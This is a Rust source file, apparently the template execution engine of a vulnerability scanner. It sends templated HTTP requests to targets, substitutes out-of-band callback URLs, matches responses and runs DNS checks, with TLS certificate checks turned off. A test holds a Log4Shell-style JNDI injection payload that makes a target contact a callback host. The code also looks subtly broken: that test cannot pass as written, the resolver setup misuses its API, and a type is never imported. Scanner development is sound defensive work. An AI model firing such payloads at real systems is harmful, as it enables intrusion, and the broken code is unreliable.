//! Template execution engine
//!
//! Orchestrates template execution against targets, handling
//! request construction, response matching, and result aggregation.

use super::loader::TemplateLoader;
use super::matcher::{DnsResponse, MatchResult, TemplateMatcher};
use super::models::{TemplateRequest, VulnerabilityTemplate};
use crate::error::{Result, SlapperError};
use reqwest::Client;
use std::sync::Arc;
use std::time::Duration;

pub struct TemplateExecutor {
    client: Client,
    loader: TemplateLoader,
    matcher: TemplateMatcher,
    timeout: Duration,
}

impl TemplateExecutor {
    pub fn new(loader: TemplateLoader) -> Result<Self> {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| SlapperError::Config(format!("Failed to create HTTP client: {}", e)))?;

        Ok(Self {
            client,
            loader,
            matcher: TemplateMatcher::new(),
            timeout: Duration::from_secs(30),
        })
    }

    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.timeout = timeout;
        self
    }

    pub fn set_interactsh_urls(&mut self, urls: Vec<String>) {
        self.matcher.set_interactsh_urls(urls);
    }

    pub async fn execute_on_target(
        &self,
        target: &str,
    ) -> Result<Vec<TemplateExecutionResult>> {
        let templates = self.loader.load_all()?;
        let mut results = Vec::new();

        for template in templates {
            let result = self.execute_template(&template, target).await;
            results.push(result);
        }

        Ok(results)
    }

    pub async fn execute_template(
        &self,
        template: &VulnerabilityTemplate,
        target: &str,
    ) -> TemplateExecutionResult {
        let mut responses = Vec::new();

        for request in &template.requests {
            match self.send_request(target, request).await {
                Ok(resp) => responses.push(resp),
                Err(e) => {
                    tracing::debug!("Request failed for {}: {}", template.id, e);
                }
            }
        }

        let mut matched = false;
        let mut matched_by = String::new();

        for resp in &responses {
            match self.matcher.match_template(template, Some(resp), None).await {
                Ok(result) => {
                    if result.matched {
                        matched = true;
                        matched_by = result.matched_by;
                        break;
                    }
                }
                Err(e) => {
                    tracing::debug!("Matcher error for {}: {}", template.id, e);
                }
            }
        }

        TemplateExecutionResult {
            template_id: template.id.clone(),
            template_name: template.info.name.clone(),
            severity: template.severity(),
            matched,
            matched_by,
            target: target.to_string(),
            responses,
        }
    }

    async fn send_request(
        &self,
        target: &str,
        request: &TemplateRequest,
    ) -> Result<reqwest::Response> {
        let url = if target.starts_with("http") {
            format!("{}/{}", target.trim_end_matches('/'), request.path.trim_start_matches('/'))
        } else {
            format!("https://{}/{}", target, request.path.trim_start_matches('/'))
        };

        let mut req_builder = match request.method.to_uppercase().as_str() {
            "GET" => self.client.get(&url),
            "POST" => self.client.post(&url),
            "PUT" => self.client.put(&url),
            "DELETE" => self.client.delete(&url),
            "PATCH" => self.client.patch(&url),
            "HEAD" => self.client.head(&url),
            "OPTIONS" => self.client.request(reqwest::Method::OPTIONS, &url),
            _ => self.client.get(&url),
        };

        for (key, value) in &request.headers {
            let processed_value = self.process_interactsh_variables(value);
            req_builder = req_builder.header(key, processed_value);
        }

        if let Some(ref body) = request.body {
            let processed_body = self.process_interactsh_variables(body);
            req_builder = req_builder.body(processed_body);
        }

        req_builder
            .timeout(self.timeout)
            .send()
            .await
            .map_err(|e| SlapperError::Network(format!("Template request failed: {}", e)))
    }

    fn process_interactsh_variables(&self, input: &str) -> String {
        if !input.contains("{{interactsh-url}}") {
            return input.to_string();
        }

        if !self.matcher.interactsh_urls.is_empty() {
            input.replace(
                "{{interactsh-url}}",
                &self.matcher.interactsh_urls[0],
            )
        } else {
            input.to_string()
        }
    }

    pub async fn execute_dns_template(
        &self,
        template: &VulnerabilityTemplate,
        target: &str,
    ) -> Result<TemplateExecutionResult> {
        let dns_matcher = template
            .matchers
            .iter()
            .find(|m| matches!(m, super::models::Matcher::Dns(_)))
            .cloned();

        let matched = if let Some(super::models::Matcher::Dns(dns)) = dns_matcher {
            let resolver = trust_dns_resolver::config::ResolverConfig::default();
            let mut resolver = trust_dns_resolver::AsyncResolver::tokio(
                resolver,
                std::time::Duration::from_secs(5).into(),
            )
            .map_err(|e| SlapperError::Config(format!("DNS resolver failed: {}", e)))?;

            let query_type = dns.query_type.as_deref().unwrap_or("A");
            let response = resolver
                .lookup(target, query_type.parse().unwrap_or(trust_dns_resolver::proto::rr::RecordType::A))
                .await
                .map_err(|e| SlapperError::Network(format!("DNS query failed: {}", e)))?;

            let answer = response
                .iter()
                .map(|r| r.to_string())
                .collect::<Vec<_>>()
                .join(", ");

            let dns_response = DnsResponse {
                query_type: query_type.to_string(),
                answer,
            };

            self.matcher.match_dns(&dns, &dns_response)?
        } else {
            false
        };

        Ok(TemplateExecutionResult {
            template_id: template.id.clone(),
            template_name: template.info.name.clone(),
            severity: template.severity(),
            matched,
            matched_by: if matched { "dns".to_string() } else { String::new() },
            target: target.to_string(),
            responses: vec![],
        })
    }
}

#[derive(Debug, Clone)]
pub struct TemplateExecutionResult {
    pub template_id: String,
    pub template_name: String,
    pub severity: Severity,
    pub matched: bool,
    pub matched_by: String,
    pub target: String,
    pub responses: Vec<reqwest::Response>,
}

impl TemplateExecutionResult {
    pub fn is_vulnerability(&self) -> bool {
        self.matched
    }
}

pub struct TemplateEngine {
    executor: Arc<TemplateExecutor>,
}

impl TemplateEngine {
    pub fn new(executor: TemplateExecutor) -> Self {
        Self {
            executor: Arc::new(executor),
        }
    }

    pub async fn scan(&self, target: &str) -> Result<Vec<TemplateExecutionResult>> {
        self.executor.execute_on_target(target).await
    }

    pub async fn scan_with_callback<F>(&self, target: &str, mut callback: F) -> Result<()>
    where
        F: FnMut(TemplateExecutionResult) + Send,
    {
        let results = self.executor.execute_on_target(target).await?;

        for result in results {
            if result.matched {
                callback(result);
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn create_test_template() -> TempDir {
        let dir = TempDir::new().unwrap();
        let path = dir.path().join("test.yaml");
        std::fs::write(
            &path,
            r#"
id: test-template
info:
  name: Test Template
  author: tester
  severity: high
requests:
  - method: GET
    path: "/test"
matchers:
  - type: http
    path: "/test"
    search:
      - pattern: "vulnerable"
        mode: word
"#,
        )
        .unwrap();
        dir
    }

    #[test]
    fn test_template_engine_creation() {
        let dir = create_test_template();
        let loader = TemplateLoader::new(vec![dir.path().to_path_buf()]);
        let executor = TemplateExecutor::new(loader);
        assert!(executor.is_ok());
    }

    #[tokio::test]
    async fn test_process_interactsh_variables() {
        let dir = create_test_template();
        let loader = TemplateLoader::new(vec![dir.path().to_path_buf()]);
        let executor = TemplateExecutor::new(loader).unwrap();

        let input = "User-Agent: ${jndi:ldap://{{interactsh-url}}/a}";
        let processed = executor.process_interactsh_variables(input);
        assert!(!processed.contains("{{interactsh-url}}"));
    }
}
